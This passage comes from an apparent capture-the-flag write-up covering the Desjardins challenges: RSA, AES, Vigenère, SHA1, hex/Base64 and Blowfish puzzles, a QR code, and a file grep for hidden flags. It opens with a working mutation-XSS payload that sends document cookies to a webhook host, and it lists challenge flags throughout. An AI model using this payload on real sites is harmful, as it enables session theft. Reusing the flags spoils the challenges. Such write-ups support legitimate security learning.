+<p>Perfect, there are multiple ways to do this, since we have script execution. We could set up an HTTP Server, or use a webhook service online such as <a data-from-md title='https://webhook.site/' href='https://webhook.site/'>Webhook.site</a>. We now need to rewrite the payload so that it send the cookies somehow:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=fetch(WEBHOOK_SITE + &quot;?&quot; + document.cookies)&gt;</pre><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">math</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mtext</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mglyph</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">fetch(WEBHOOK_SITE</span> + &quot;?&quot; + <span class="hljs-attr">document.cookies</span>)&gt;</span></span></code></pre></div>
+<p>This will result in a request like this from the hosted server:</p>
+<p><img src="_resources/82dc51fa921c4a9089da4bf91ce7bfcb.png" alt="8e96e2a96962ac9e40a7ccde5c6d5036.png"></p>
+<p>The flag is indeed in the request url!</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">FLAG-{i3nt_mUtation_X55_1nt3resting}</pre><pre class="hljs"><code><span class="hljs-attribute">FLAG</span>-{i<span class="hljs-number">3</span>nt_mUtation_X<span class="hljs-number">55</span>_<span class="hljs-number">1</span>nt<span class="hljs-number">3</span>resting}</code></pre></div>
+<h4 id="note-since-the-challenge-page-is-down-because-im-writting-this-after-the-ctf-i-dont-have-any-screenshots-but-i-will-update-this-as-soon-as-i-have-the-source-code-for-the-challenge">Note: Since the challenge page is down, because I'm writting this after the CTF, I don't have any screenshots, but I will update this as soon as I have the source code for the challenge.</h4>
+<h1 id="crypto">Crypto</h1>
+<h2 id="desjardins-crypto-challenge-1">[Desjardins] Crypto Challenge 1</h2>
+<p>For this challenge, two strings were given and the challenge specs mentionned:</p>
+<blockquote>
+<p>Rivest, Shamir and Adleman offer you this key:</p>
+</blockquote>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQClBhktGHYjjMAM4ddiPtM2xxQwvpge+DoSE2xiiJVuxxtyJWZ14vtumogYYu0oUtSir5thiig+rA+K6CKwKVVlvx84lc7s3FmCJZIpkTgc2JIlomIYITZRMsLuCw6aVTwUfbQNpSWrHTB5hbuDjZvntRm8JCTySAbDDKOFCPhFzQIDAQAB
+</pre><pre class="hljs"><code><span class="hljs-attribute">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQClBhktGHYjjMAM4ddiPtM2xxQwvpge</span>+DoSE<span class="hljs-number">2</span>xiiJVuxxtyJWZ<span class="hljs-number">14</span>vtumogYYu<span class="hljs-number">0</span>oUtSir<span class="hljs-number">5</span>thiig+rA+K<span class="hljs-number">6</span>CKwKVVlvx<span class="hljs-number">84</span>lc<span class="hljs-number">7</span>s<span class="hljs-number">3</span>FmCJZIpkTgc<span class="hljs-number">2</span>JIlomIYITZRMsLuCw<span class="hljs-number">6</span>aVTwUfbQNpSWrHTB<span class="hljs-number">5</span>hbuDjZvntRm<span class="hljs-number">8</span>JCTySAbDDKOFCPhFzQIDAQAB
+</code></pre></div>
+<blockquote>
+<p>Then, the president of Desjardins sends you this message:</p>
+</blockquote>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">gj7cZOUJK1XeKjVeqG+DYh8l9mRucS9b43zZkzvvBpsNVxgfxxlHB68t7Wl/Vn0zMjPRzybGfTNZBtrHygON0tDbsRBMfUVcfRppugXxB4Gw273vn28nJDxqS8MjvoxQvMmvXcaM+Ks4FtABgslogHq5Okgt5lbYgAKXTHBjnuo=</pre><pre class="hljs"><code><span class="hljs-attribute">gj7cZOUJK1XeKjVeqG</span>+DYh<span class="hljs-number">8</span>l<span class="hljs-number">9</span>mRucS<span class="hljs-number">9</span>b<span class="hljs-number">43</span>zZkzvvBpsNVxgfxxlHB<span class="hljs-number">68</span>t<span class="hljs-number">7</span>Wl/Vn<span class="hljs-number">0</span>zMjPRzybGfTNZBtrHygON<span class="hljs-number">0</span>tDbsRBMfUVcfRppugXxB<span class="hljs-number">4</span>Gw<span class="hljs-number">273</span>vn<span class="hljs-number">28</span>nJDxqS<span class="hljs-number">8</span>MjvoxQvMmvXcaM+Ks<span class="hljs-number">4</span>FtABgslogHq<span class="hljs-number">5</span>Okgt<span class="hljs-number">5</span>lbYgAKXTHBjnuo=</code></pre></div>
+<p>Right off the bat, it's not hard to notice that the names of the people that gave you the key spell out RSA when putting their initials together. <a data-from-md title='https://simple.wikipedia.org/wiki/RSA_algorithm' href='https://simple.wikipedia.org/wiki/RSA_algorithm'>RSA</a> is an assymetric ecryption algorithm, meaning that it has two different keys - a public key and a private key. The public key can be given to anyone, they will use that key to encrypt messages that they want you to see, because only a specific private key will be able to decrypt the message encrypted with a public key. In this case, the public key is the one that Rivest, Shamir and Adleman gave you and the encrypted message is the one from the President of Desjardins. There are numerous decrypters online, <a data-from-md title='https://www.devglan.com/online-tools/rsa-encryption-decryption' href='https://www.devglan.com/online-tools/rsa-encryption-decryption'>I chose this one</a>.</p>
+<p>Make sure to set the RSA key type to public:</p>
+<p><img src="_resources/2a97ed4fc1644791879b09b3fbf9d98b.png" alt="bbc6b4450adc302322af3eccee50f694.png"></p>
+<p>Here we go: <code class="inline-code">FLAG-{dorimene!}</code> !</p>
+<h2 id="desjardins-crypto-challenge-2">[Desjardins] Crypto Challenge 2</h2>
+<p>This challenge gives us a string:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">gdag1fhRRyFCW84AjjtXoFFAFV8qUvG4+aHXY2Dt+q2vk48pvsW06SA5TW1KbKiJXKliSm/wKdenWZS39+Dp2tAYeE5GgxD6g3LU+HF/C9Pi/vJ5218Arrwyev6WXH66GhQAI+0R12kR2tBRl7AZN8NwXg82GHtG6JmYKR+jdaQrSOrJS9nMNtLvAGkW6sOtClaqHSxx4J5vXdVAj2u6ANlhG61THOTaSiAzDJ6Momg3AC0m8oX3U5/8DnohptgX4ES0FzgURnGvHjlZwikcnaD8OM3ty0Qjc1qDTd/eXNxXvMPBDcmSwrKDO8k3hCsISdDOxXlaa15t2irIzw1xtnjPqE+zWFPcJ+r9Bekn1MFw8yFk6uxYmOfYyGtBst1JhwuJm3EOQqS0JqDm2dzdj1EA2L7pdfLlobcn8sy85FoHMzI7Pf5x1v6UD2DHIngQf1nao5S/dKWNFz2HbrkSywG382GLS3H/KR6Ep0NtMt7j7aQfnZUtFQoKITP6EiIQNd1E10KMtiCmFPIOyP+UoVJRb+dEkrsHbtHbZL9YVR4dnd3/W4b0j3DrpSKgILpHX6lb62TXycZjfjPR3+v40BLjamxKlPxhHEJRODjXbwGKsXbfvTfQAX/Hyg3fOYv4aguShVqZNubtEZO9CQKXKQ==</pre><pre class="hljs"><code><span class="hljs-attribute">gdag1fhRRyFCW84AjjtXoFFAFV8qUvG4</span>+aHXY<span class="hljs-number">2</span>Dt+q<span class="hljs-number">2</span>vk<span class="hljs-number">48</span>pvsW<span class="hljs-number">06</span>SA<span class="hljs-number">5</span>TW<span class="hljs-number">1</span>KbKiJXKliSm/wKdenWZS<span class="hljs-number">39</span>+Dp<span class="hljs-number">2</span>tAYeE<span class="hljs-number">5</span>GgxD<span class="hljs-number">6</span>g<span class="hljs-number">3</span>LU+HF/C<span class="hljs-number">9</span>Pi/vJ<span class="hljs-number">5218</span>Arrwyev<span class="hljs-number">6</span>WXH<span class="hljs-number">66</span>GhQAI+<span class="hljs-number">0</span>R<span class="hljs-number">12</span>kR<span class="hljs-number">2</span>tBRl<span class="hljs-number">7</span>AZN<span class="hljs-number">8</span>NwXg<span class="hljs-number">82</span>GHtG<span class="hljs-number">6</span>JmYKR+jdaQrSOrJS<span class="hljs-number">9</span>nMNtLvAGkW<span class="hljs-number">6</span>sOtClaqHSxx<span class="hljs-number">4</span>J<span class="hljs-number">5</span>vXdVAj<span class="hljs-number">2</span>u<span class="hljs-number">6</span>ANlhG<span class="hljs-number">61</span>THOTaSiAzDJ<span class="hljs-number">6</span>Momg<span class="hljs-number">3</span>AC<span class="hljs-number">0</span>m<span class="hljs-number">8</span>oX<span class="hljs-number">3</span>U<span class="hljs-number">5</span>/<span class="hljs-number">8</span>DnohptgX<span class="hljs-number">4</span>ES<span class="hljs-number">0</span>FzgURnGvHjlZwikcnaD<span class="hljs-number">8</span>OM<span class="hljs-number">3</span>ty<span class="hljs-number">0</span>Qjc<span class="hljs-number">1</span>qDTd/eXNxXvMPBDcmSwrKDO<span class="hljs-number">8</span>k<span class="hljs-number">3</span>hCsISdDOxXlaa<span class="hljs-number">15</span>t<span class="hljs-number">2</span>irIzw<span class="hljs-number">1</span>xtnjPqE+zWFPcJ+r<span class="hljs-number">9</span>Bekn<span class="hljs-number">1</span>MFw<span class="hljs-number">8</span>yFk<span class="hljs-number">6</span>uxYmOfYyGtBst<span class="hljs-number">1</span>JhwuJm<span class="hljs-number">3</span>EOQqS<span class="hljs-number">0</span>JqDm<span class="hljs-number">2</span>dzdj<span class="hljs-number">1</span>EA<span class="hljs-number">2</span>L<span class="hljs-number">7</span>pdfLlobcn<span class="hljs-number">8</span>sy<span class="hljs-number">85</span>FoHMzI<span class="hljs-number">7</span>Pf<span class="hljs-number">5</span>x<span class="hljs-number">1</span>v<span class="hljs-number">6</span>UD<span class="hljs-number">2</span>DHIngQf<span class="hljs-number">1</span>nao<span class="hljs-number">5</span>S/dKWNFz<span class="hljs-number">2</span>HbrkSywG<span class="hljs-number">382</span>GLS<span class="hljs-number">3</span>H/KR<span class="hljs-number">6</span>Ep<span class="hljs-number">0</span>NtMt<span class="hljs-number">7</span>j<span class="hljs-number">7</span>aQfnZUtFQoKITP<span class="hljs-number">6</span>EiIQNd<span class="hljs-number">1</span>E<span class="hljs-number">10</span>KMtiCmFPIOyP+UoVJRb+dEkrsHbtHbZL<span class="hljs-number">9</span>YVR<span class="hljs-number">4</span>dnd<span class="hljs-number">3</span>/W<span class="hljs-number">4</span>b<span class="hljs-number">0</span>j<span class="hljs-number">3</span>DrpSKgILpHX<span class="hljs-number">6</span>lb<span class="hljs-number">62</span>TXycZjfjPR<span class="hljs-number">3</span>+v<span class="hljs-number">40</span>BLjamxKlPxhHEJRODjXbwGKsXbfvTfQAX/Hyg<span class="hljs-number">3</span>fOYv<span class="hljs-number">4</span>aguShVqZNubtEZO<span class="hljs-number">9</span>CQKXKQ==</code></pre></div>
+<p>And states that a historian gave us this encrypted message, which was encrypted using <em>a very popular</em> algorithm that was released in <strong>1998</strong> and that we needed to decrypt it using the last flag as key. After a bit of research, I found four rather popular encryption algorithms that came out in 1998: Twofish, AES, CS-Cipher and COCONUT98.</p>
+<p>Because of the little information I had for the challenge and for the algorithms, I eliminated CS-Cipher &amp; COCONUT98, but was left with AES and Twofish. AES has many forms, but the one I was interested by was AES-128, because of the 16 byte key that I had found in the previous challenge. Since I didn't have an IV, I had to use the <a data-from-md title='https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)' href='https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)'>ECB mode of operation</a>.<br>
+There are numerous decrypters online, <a data-from-md title='https://encode-decode.com/aes-128-ecb-encrypt-online/' href='https://encode-decode.com/aes-128-ecb-encrypt-online/'>I chose this one</a>.</p>
+<p>With the parameters as:<br>
+<img src="_resources/df55404c7d594a9ca3554047c6439d53.png" alt="fb8c3a061716968ad2cddf335d66a34c.png"></p>
+<p>We get the flag: <code class="inline-code">FLAG-{cooperation}</code>!</p>
+<p>It's important to also note down or read carefully the resulting message, because it contains the hint &quot;Alphonse Desjardins&quot;, that is used for the next challenge.</p>
+<h2 id="desjardins-crypto-challenge-3">[Desjardins] Crypto Challenge 3</h2>
+<p>For this one, the challenge spec gave us a string:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Dfoks! Mona oign ftyjsb i frucisvv lx koets rt Zzgxvseg. Dcjv momzs pwzhjvv pxzgbpbsapv, lx Uchxsatrk dxa Qnkggtw Uelroefwbh ijt nv gluhsbi ue viwfusg hyi lx ucqgzs rsfpxzogkt tdrue em TYCU-{gxbuevmaotsaxpvnxctpgbh} eei Aexvbpgs Sijjtzrvpg o Aimil ii Dwsptg,Tagirn. Ecbhmuekms ccf zp vvvnm gcgqwppzsxm Hug Pocovr vwazg z'ici uel xzhu waesittvhru wbhxztnbwbpg txrrnvqsegg oj qfnwm. Rr rzih, pv Mhcjrosbi Hvscifqkbg umxukm stczsbiet iifzk zsh gvnm usvnzsjvj efxzbasigw ru fwbqg gsase lx uotcnwci Wokjsf.
+</pre><pre class="hljs"><code>Dfoks! Mona oign ftyjsb i frucisvv lx koets rt Zzgxvseg. Dcjv momzs pwzhjvv pxzgbpbsapv, lx Uchxsatrk dxa Qnkggtw Uelroefwbh ijt <span class="hljs-built_in">nv</span> gluhsbi ue viwfusg hyi lx ucqgzs rsfpxzogkt tdrue em TYCU-{gxbuevmaotsaxpvnxctpgbh} eei Aexvbpgs Sijjtzrvpg o Aimil <span class="hljs-built_in">ii</span> Dwsptg,Tagirn. Ecbhmuekms ccf zp vvvnm gcgqwppzsxm Hug Pocovr vwazg z<span class="hljs-string">&#x27;ici uel xzhu waesittvhru wbhxztnbwbpg txrrnvqsegg oj qfnwm. Rr rzih, pv Mhcjrosbi Hvscifqkbg umxukm stczsbiet iifzk zsh gvnm usvnzsjvj efxzbasigw ru fwbqg gsase lx uotcnwci Wokjsf.
+</span></code></pre></div>
+<p>And says:</p>
+<blockquote>
+<p>Using the word found in the flag of the Desjardins' historian message, what does the message on this poster mean?</p>
+</blockquote>
+<p>Right off the bat we see: <code class="inline-code">TYCU-{gxbuevmaotsaxpvnxctpgbh}</code>. Which means that it's a caesar cipher, since this has the exact shape of the flag we want. The only caesar cipher I know of that uses a key is <a data-from-md title='https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher' href='https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher'>Vignere Cipher</a>. There are numerous decoders online, <a data-from-md title='https://gchq.github.io/CyberChef/' href='https://gchq.github.io/CyberChef/'>I chose this one</a>.</p>
+<p>And here we go:</p>
+<p><img src="_resources/096b674dce894f01a2329998a3fce54e.png" alt="18eed721cb1950507f2fb9e75bdfdf23.png"></p>
+<p>We get the flag: <code class="inline-code">FLAG-{sixdecembremileneufcent}</code>!</p>
+<h2 id="desjardins-crypto-challenge-4">[Desjardins] Crypto Challenge 4</h2>
+<p>Suprisingly, this had very little solves. The challenge spec was:</p>
+<blockquote>
+<p>A Desjardins employee tells you that according to the NSA, this former stenographer in Ottawa only had one cat (Chat in french).</p>
+</blockquote>
+<p>Here, &quot;one cat&quot; in french becomes &quot;un chat&quot;, which reads out as &quot;un sha&quot;, hence meaning that we need to do something with SHA1.<br>
+I attempted to encrypt a bunch of stuff and submit, but nothing worked, until I used the name that found before Alphonse Desjardins&quot;. Encrypting it and putting the encrypted text inside of curly braces with the FLAG prefix gives us the flag:</p>
+<p><code class="inline-code">FLAG-{4f5feb845589394f668a1d7d09cbea95f28852a1}</code></p>
+<h2 id="desjardins-hextysixtymany">[Desjardins] HextySixtyMany</h2>
+<p>This challenge did not give any spec. It only had an RTF File, which contained the following:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">4e 57 45 67 4e 6d 51 67 4e 7a 67 67 4e 6a 67 67 4e 57 45 67 4e 7a 6b 67 4d 7a 45 67 4d 7a 63 67 4e 6a 51 67 4e 44 63 67 4e 6a 63 67 4e 7a 67 67 4e 6a 4d 67 4d 7a 45 67 4d 7a 67 67 4e 7a 63 67 4e 6a 49 67 4e 6d 45 67 4e 47 55 67 4e 6a 59 67 4e 47 51 67 4e 54 67 67 4e 47 55 67 4e 6a 59 67 4e 54 6b 67 4e 54 59 67 4d 7a 6b 67 4e 6a 6b 67 4e 47 51 67 4e 54 67 67 4e 54 49 67 4e 6a 59 67 4e 6a 45 67 4e 44 63 67 4e 44 59 67 4e 7a 6b 67 4e 57 45 67 4e 44 51 67 4e 47 55 67 4e 7a 6b 67 4e 6a 59 67 4e 54 45 67 4d 32 51 67 4d 32 51 3d</pre><pre class="hljs"><code><span class="hljs-number">4</span>e <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>d <span class="hljs-number">51</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">67</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">67</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">6</span>b <span class="hljs-number">67</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">63</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">51</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">63</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">63</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">67</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">4</span>d <span class="hljs-number">67</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">67</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">63</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">49</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>d <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">55</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">59</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">51</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">67</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">55</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">59</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">6</span>b <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">59</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">6</span>b <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">6</span>b <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">51</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">67</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">49</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">59</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">63</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">59</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">6</span>b <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">51</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">55</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">6</span>b <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">59</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">45</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>d <span class="hljs-number">32</span> <span class="hljs-number">51</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>d <span class="hljs-number">32</span> <span class="hljs-number">51</span> <span class="hljs-number">3</span>d</code></pre></div>
+<p>If we decode the Hex, we get:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">NWEgNmQgNzggNjggNWEgNzkgMzEgMzcgNjQgNDcgNjcgNzggNjMgMzEgMzggNzcgNjIgNmEgNGUgNjYgNGQgNTggNGUgNjYgNTkgNTYgMzkgNjkgNGQgNTggNTIgNjYgNjEgNDcgNDYgNzkgNWEgNDQgNGUgNzkgNjYgNTEgM2QgM2Q=</pre><pre class="hljs"><code><span class="hljs-symbol">NWEgNmQgNzggNjggNWEgNzkgMzEgMzcgNjQgNDcgNjcgNzggNjMgMzEgMzggNzcgNjIgNmEgNGUgNjYgNGQgNTggNGUgNjYgNTkgNTYgMzkgNjkgNGQgNTggNTIgNjYgNjEgNDcgNDYgNzkgNWEgNDQgNGUgNzkgNjYgNTEgM2</span>Qg<span class="hljs-name">M2</span>Q=</code></pre></div>
+<p>Which is Base64. Decoding the Base64, we get another chain of hex and decoding that hex we get the flag:</p>
+<p>Here is the series of transformation:</p>
+<p><img src="_resources/f049773be181414eaacc1b633e73bc98.png" alt="1bbe5e0ad10f341c5bff7d5ecd832eac.png"></p>
+<p>And we get the flag: <code class="inline-code">flag-{th1s_0n3_1s_a_b1t_hard3r}</code> !</p>
+<br class="jop-noMdConv"/>
+<h2 id="desjardins-hex-in-the-forest">[Desjardins] Hex in the Forest</h2>
+<p>For this challenge, the spec gives us an RTF File with this</p>
+<blockquote>
+<p><img src="_resources/39e05175296f42adaa45b6ba000033ca.png" alt="aef14fc03e1b6465e67c0c60c7299954.png"></p>
+</blockquote>
+<p>If we try the same thing as the previous challenge, meaning decode the hex, we get :</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Nice try, but this is not the hex in the file. You must catch the blowfish using the bosemann key. If you speak Latin, then ask the Cyber-Chef on the CBC using the forty-four iv, to find the raw hex salad that is found in the forest.
+0680ba0f70abaaa0af269228ac7044982587ad80c5e32d78404d0861b0538450d674dd701944be2e</pre><pre class="hljs"><code>Nice try, but this is <span class="hljs-keyword">not</span> the hex <span class="hljs-keyword">in</span> the file. You must catch the blowfish using the bosemann key. <span class="hljs-keyword">If</span> you speak Latin, then ask the Cyber-Chef on the CBC using the forty-four iv, <span class="hljs-keyword">to</span> <span class="hljs-builtin-name">find</span> the<span class="hljs-built_in"> raw </span>hex salad that is found <span class="hljs-keyword">in</span> the forest.
+0680ba0f70abaaa0af269228ac7044982587ad80c5e32d78404d0861b0538450d674dd701944be2e</code></pre></div>
+<p>Alright, this made it very easy. Here are the keywords:</p>
+<ul>
+<li>blowfish</li>
+<li>bosemann key</li>
+<li>Latin</li>
+<li>forty-four iv</li>
+<li>CBC</li>
+<li>0680ba0f70abaaa0af269228ac7044982587ad80c5e32d78404d0861b0538450d674dd701944be2e</li>
+</ul>
+<p>These mean that we are using the blowfish encryption algorithm, using &quot;bosemann&quot; as the key, &quot;Latin&quot; as the key format, using the CBC Mode of operation, since we are given the IV (forty-four).</p>
+<p>Pluging all of that into CyberChef:<br>
+<img src="_resources/0eada8a36a7f4966a5f1f3d6ba52dca9.png" alt="5db1e1824699b92703d6afce2df69787.png"></p>
+<h1 id="steganography">Steganography</h1>
+<h2 id="desjardins-qr">[Desjardins] QR</h2>
+<p>For this challenge we are given a QR Code. If we use a <a data-from-md title='https://eqrcode.co/a/6cOsNt' href='https://eqrcode.co/a/6cOsNt'>QR Reader</a>, we get the flag: <code class="inline-code">flag-{Ah!_ c0mme_la_ne1ge@neigé!}</code></p>
+<h2 id="desjardins-leonardo">[Desjardins] Leonardo</h2>
+<h3 id="note-for-these-next-few-challenges-i-honestly-couldnt-remember-which-flag-belonged-to-which-challenge-therefore-all-of-the-flags-will-be-listed-under-this-section">Note: For these next few challenges, I honestly couldn't remember which flag belonged to which challenge, therefore all of the flags will be listed under this section.</h3>
+<p>For this challenge, we are given an RTF File. If we read the contents we see a 99 page document containing some foreign language.</p>
+<p>If instead we cat the file and grep using case insensitive and match all regexp for the word &quot;flag&quot;, we get:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="sh" data-joplin-source-open="```sh&#10;" data-joplin-source-close="&#10;```">❯ cat Anmerkungen-zur-Transkription.rtf | grep -ie &quot;flag&quot;
+      gesperrt: \cf2 flag-\{L30nard_de_V1nc1_number01of05\}\cf0 \
+[Illustration: Flag. 3.] ZmxhZy17TDMwbmFyZF9kZV9WMW5jMV9udW1iZXIwMzgyNDYzMDJ9\
+5. ~Diese Flagge wurde mit einem Cesar mit einem Versatz \
+         gibt in der neuen Auflage seiner Princ. of mechanism. \'fcbrigens\
+nutzbar zu machen. -- Leonardo da Vinci flag-\{L30nard_de_V1nc1_betrachtet\}\</pre><pre class="hljs"><code>❯ cat Anmerkungen-zur-Transkription.rtf | grep -ie <span class="hljs-string">&quot;flag&quot;</span>
+      gesperrt: \cf2 flag-\{L30nard_de_V1nc1_number01of05\}\cf0 \
+[Illustration: Flag. 3.] ZmxhZy17TDMwbmFyZF9kZV9WMW5jMV9udW1iZXIwMzgyNDYzMDJ9\
+5. ~Diese Flagge wurde mit einem Cesar mit einem Versatz \
+         gibt <span class="hljs-keyword">in</span> der neuen Auflage seiner Princ. of mechanism. \<span class="hljs-string">&#x27;fcbrigens\
+nutzbar zu machen. -- Leonardo da Vinci flag-\{L30nard_de_V1nc1_betrachtet\}\</span></code></pre></div>
+<p>So we have two flags right off the bat, the first one is <code class="inline-code">flag-{L30nard_de_V1nc1_number01of05}</code>, the second one <code class="inline-code">flag-{L30nard_de_V1nc1_betrachtet}</code>.</p>
+<p>Furtheremore, if we open up the file inside of a text editor and search for the word flag, we get:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">5. ~Diese Flagge wurde mit einem Cesar mit einem Versatz \
+der Nummer dieses Absatzes versteckt kqfl-\{Q30sfwi_ij_A1sh1_szrgjw_AZERTY\}\</pre><pre class="hljs"><code><span class="hljs-number">5</span>. ~<span class="hljs-keyword">Diese </span>Flagge wurde mit <span class="hljs-keyword">einem </span>Cesar mit <span class="hljs-keyword">einem </span>Versatz \
+der Nummer <span class="hljs-keyword">dieses </span>Absatzes versteckt kqfl-\{Q30sfwi_ij_A1sh1_szrgjw_AZERTY\}\</code></pre></div>
+<p>Which looks awfully close to a flag, but rotated, so let's fix that:<br>
+<img src="_resources/71ab9aaa4a72407aabd6fd8913288948.png" alt="faad0a90763e019a54a30871229b2d80.png"></p>
+<p>With a simple ROT21, we get the third flag: <code class="inline-code">flag-{L30nard_de_V1nc1_number_VUZMOT}</code></p>
+<p>One of the challenges also stated that there was a hidden picture inside of the file. Conveniently, if we search some more for the word flag in the text editor (i.e.: in vscode), we see</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">[Illustration: Flag. 3.] ZmxhZy17TDMwbmFyZF9kZV9WMW5jMV9udW1iZXIwMzgyNDYzMDJ9\
